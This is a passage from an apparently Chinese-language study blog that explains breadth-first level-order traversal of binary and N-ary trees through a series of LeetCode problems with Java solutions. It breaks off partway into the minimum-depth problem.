class="built_in">this</span>.left = left;</span><br><span class="line">        <span class="built_in">this</span>.right = right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二叉树的层序遍历"><a href="#二叉树的层序遍历" class="headerlink" title="二叉树的层序遍历"></a>二叉树的层序遍历</h2><h3 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102.二叉树的层序遍历"></a>102.二叉树的层序遍历</h3><p>给你二叉树的根节点 root ，返回其节点值的 层序遍历 。 （即逐层地，从左到右访问所有节点）。</p><p>层序遍历一个二叉树。就是从左到右一层一层的去遍历二叉树。这种遍历的方式和我们之前讲过的都不太一样。需要借用一个辅助数据结构即队列来实现，队列先进先出，符合一层一层遍历的逻辑，而用栈先进后出适合模拟深度优先遍历也就是递归的逻辑。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; resList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="comment">// checkFun01(root, 0)</span></span><br><span class="line">        checkFun02(root);</span><br><span class="line">        <span class="keyword">return</span> resList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//BFS 递归方式</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkFun01</span><span class="params">(TreeNode node, Integer deep)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        deep++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(resList.size() &lt; deep)&#123;</span><br><span class="line">            <span class="comment">// 当层级增加时，List的Item也增加，利用list的索引值进行层级界定</span></span><br><span class="line">            List&lt;Integer&gt; item = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">            resList.add(item);</span><br><span class="line">        &#125;</span><br><span class="line">        resList.get(deep - <span class="number">1</span>).add(node.val);</span><br><span class="line">        checkFun01(node.left, deep);</span><br><span class="line">        checkFun01(node.right, deep);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 迭代方式 - 借助队列</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkFun02</span><span class="params">(TreeNode node)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) <span class="keyword">return</span> ;</span><br><span class="line">        Queue&lt;TreeNode&gt; que = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;TreeNode&gt;();</span><br><span class="line">        que.offer(node);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!que.isEmpty())&#123;</span><br><span class="line">            List&lt;Integer&gt; itemList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Integer&gt;();</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> que.size();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">tmpNode</span> <span class="operator">=</span> que.poll();</span><br><span class="line">                itemList.add(tmpNode.val);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(tmpNode.left != <span class="literal">null</span>) que.offer(tmpNode.left);</span><br><span class="line">                <span class="keyword">if</span>(tmpNode.right != <span class="literal">null</span>) que.offer(tmpNode.right);</span><br><span class="line">                len--;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            resList.add(itemList);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="107-二叉树的层次遍历-II"><a href="#107-二叉树的层次遍历-II" class="headerlink" title="107.二叉树的层次遍历 II"></a>107.二叉树的层次遍历 II</h3><p>给你二叉树的根节点 root ，返回其节点值 自底向上的层序遍历 。 （即按从叶子节点所在层到根节点所在的层，逐层从左向右遍历）</p><p>相对于102.二叉树的层序遍历，就是最后把result数组反转一下就可以了。</p><h3 id="199-二叉树的右视图"><a href="#199-二叉树的右视图" class="headerlink" title="199.二叉树的右视图"></a>199.二叉树的右视图</h3><p>给定一个二叉树的 根节点 root，想象自己站在它的右侧，按照从顶部到底部的顺序，返回从右侧所能看到的节点值。<br><img src="/2024/10/29/algorithm/binarytree/image-8.png"><br>输入: [1,2,3,null,5,null,4]<br>输出: [1,3,4]</p><p>层序遍历的时候，判断是否遍历到单层的最后面的元素，如果是，就放进result数组中，随后返回result就可以了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">rightSideView</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Deque&lt;TreeNode&gt; que = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        que.offerLast(root);</span><br><span class="line">        <span class="keyword">while</span>(!que.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">levelSize</span> <span class="operator">=</span> que.size();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; levelSize; i++)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">poll</span> <span class="operator">=</span> que.pollFirst();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(poll.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    que.addLast(poll.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(poll.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    que.addLast(poll.right);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(i == levelSize - <span class="number">1</span>)&#123;</span><br><span class="line">                    list.add(poll.val);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="637-二叉树的层平均值"><a href="#637-二叉树的层平均值" class="headerlink" title="637.二叉树的层平均值"></a>637.二叉树的层平均值</h3><p>给定一个非空二叉树, 返回一个由每层节点平均值组成的数组。<br><img src="/2024/10/29/algorithm/binarytree/image-9.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Double&gt; <span class="title function_">averageOfLevels</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Double&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Deque&lt;TreeNode&gt; que = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        que.offerLast(root);</span><br><span class="line">        <span class="keyword">while</span>(!que.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">levelSize</span> <span class="operator">=</span> que.size();</span><br><span class="line">            <span class="type">Double</span> <span class="variable">levelSum</span> <span class="operator">=</span> <span class="number">0.0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; levelSize; i++)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">poll</span> <span class="operator">=</span> que.pollFirst();</span><br><span class="line"></span><br><span class="line">                levelSum += poll.val;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(poll.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    que.addLast(poll.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(poll.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    que.addLast(poll.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list.add(levelSum / levelSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="429-N叉树的层序遍历"><a href="#429-N叉树的层序遍历" class="headerlink" title="429.N叉树的层序遍历"></a>429.N叉树的层序遍历</h3><p>给定一个 N 叉树，返回其节点值的层序遍历。 (即从左到右，逐层遍历)。<br>例如，给定一个 3叉树 :<br><img src="/2024/10/29/algorithm/binarytree/image-10.png"><br>返回其层序遍历:<br>[ [1], [3,2,4], [5,6] ]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(Node root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Deque&lt;Node&gt; que = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        que.offerLast(root);</span><br><span class="line">        <span class="keyword">while</span>(!que.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">levelSize</span> <span class="operator">=</span> que.size();</span><br><span class="line">            List&lt;Integer&gt; levelList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; levelSize; i++)&#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">poll</span> <span class="operator">=</span> que.pollFirst();</span><br><span class="line"></span><br><span class="line">                levelList.add(poll.val);</span><br><span class="line"></span><br><span class="line">                List&lt;Node&gt; children = poll.children;</span><br><span class="line">                <span class="keyword">if</span>(children == <span class="literal">null</span> || children.size() == <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(Node child : children)&#123;</span><br><span class="line">                    <span class="keyword">if</span> (child != <span class="literal">null</span>)&#123;</span><br><span class="line">                        que.offerLast(child);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            list.add(levelList);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="515-在每个树行中找最大值"><a href="#515-在每个树行中找最大值" class="headerlink" title="515.在每个树行中找最大值"></a>515.在每个树行中找最大值</h3><p>给定一棵二叉树的根节点 root ，请找出该二叉树中每一层的最大值。<br><img src="/2024/10/29/algorithm/binarytree/image-11.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">largestValues</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> Collections.emptyList();</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> queue.size(); i &gt; <span class="number">0</span>; i--)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                max = Math.max(max, node.val);</span><br><span class="line">                <span class="keyword">if</span>(node.left != <span class="literal">null</span>) queue.offer(node.left);</span><br><span class="line">                <span class="keyword">if</span>(node.right != <span class="literal">null</span>) queue.offer(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">            result.add(max);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="116-填充每个节点的下一个右侧节点指针"><a href="#116-填充每个节点的下一个右侧节点指针" class="headerlink" title="116.填充每个节点的下一个右侧节点指针"></a>116.填充每个节点的下一个右侧节点指针</h3><p>给定一个 完美二叉树 ，其所有叶子节点都在同一层，每个父节点都有两个子节点。二叉树定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct Node &#123;</span><br><span class="line">  int val;</span><br><span class="line">  Node *left;</span><br><span class="line">  Node *right;</span><br><span class="line">  Node *next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。</p><p>初始状态下，所有 next 指针都被设置为 NULL。</p><p><img src="/2024/10/29/algorithm/binarytree/image-12.png"></p><p>本题依然是层序遍历，只不过在单层遍历的时候记录一下本层的头部节点，然后在遍历的时候让前一个节点指向本节点就可以了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Node <span class="title function_">connect</span><span class="params">(Node root)</span> &#123;</span><br><span class="line">        Queue&lt;Node&gt; tmpQueue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Node&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root != <span class="literal">null</span>) tmpQueue.add(root);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(tmpQueue.size() != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> tmpQueue.size();</span><br><span class="line">            <span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> tmpQueue.poll();</span><br><span class="line">            <span class="keyword">if</span>(cur.left != <span class="literal">null</span>) tmpQueue.add(cur.left);</span><br><span class="line">            <span class="keyword">if</span>(cur.right != <span class="literal">null</span>) tmpQueue.add(cur.right);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">1</span>; index &lt; size; index++)&#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">next</span> <span class="operator">=</span> tmpQueue.poll();</span><br><span class="line">                <span class="keyword">if</span>(next.left != <span class="literal">null</span>) tmpQueue.add(next.left);</span><br><span class="line">                <span class="keyword">if</span>(next.right != <span class="literal">null</span>) tmpQueue.add(next.right);</span><br><span class="line"></span><br><span class="line">                cur.next = next;</span><br><span class="line">                cur = next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="117-填充每个节点的下一个右侧节点指针-II"><a href="#117-填充每个节点的下一个右侧节点指针-II" class="headerlink" title="117. 填充每个节点的下一个右侧节点指针 II"></a>117. 填充每个节点的下一个右侧节点指针 II</h3><p>给定一个二叉树：</p><p>struct Node {<br>  int val;<br>  Node *left;<br>  Node *right;<br>  Node *next;<br>}<br>填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL 。</p><p>初始状态下，所有 next 指针都被设置为 NULL 。<br><img src="/2024/10/29/algorithm/binarytree/image-13.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Node <span class="title function_">connect</span><span class="params">(Node root)</span> &#123;</span><br><span class="line">        Queue&lt;Node&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root != <span class="literal">null</span>)&#123;</span><br><span class="line">            queue.add(root);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">nodePre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                    nodePre = queue.poll(); <span class="comment">//取出本层头一个节点</span></span><br><span class="line">                    node = nodePre;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    node = queue.poll();</span><br><span class="line">                    nodePre.next = node; <span class="comment">// 本层前一个节点 next 指向当前节点</span></span><br><span class="line">                    nodePre = nodePre.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            nodePre.next = <span class="literal">null</span> ; <span class="comment">// 本层最后一个next指向null</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="104.二叉树的最大深度"></a>104.二叉树的最大深度</h3><p>给定一个二叉树，找出其最大深度。二叉树的 最大深度 是指从根节点到最远叶子节点的最长路径上的节点数。<br>说明: 叶子节点是指没有子节点的节点。</p><p>使用迭代法的话，使用层序遍历是最为合适的，因为最大的深度就是二叉树的层数，和层序遍历的方式极其吻合。<br>在二叉树中，一层一层的来遍历二叉树，记录一下遍历的层数就是二叉树的深度，所以这道题的迭代法就是一道模板题，可以使用二叉树层序遍历的模板来解决的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        Queue&lt;TreeNode&gt; que = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        que.offer(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!que.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> que.size();</span><br><span class="line">            <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> que.poll();</span><br><span class="line">                <span class="keyword">if</span>(node.left != <span class="literal">null</span>) que.offer(node.left);</span><br><span class="line">                <span class="keyword">if</span>(node.right != <span class="literal">null</span>) que.offer(node.right);</span><br><span class="line">                len--;</span><br><span class="line">            &#125;</span><br><span class="line">            depth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="111-二叉树的最小深度"><a href="#111-二叉树的最小深度" class="headerlink" title="111.二叉树的最小深度"></a>111.二叉树的最小深度</h3><p>给定一个二叉树，找出其最小深度。<br>最小深度是从根节点到最近叶子节点的最短路径上的节点数量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(TreeNode root)</span> 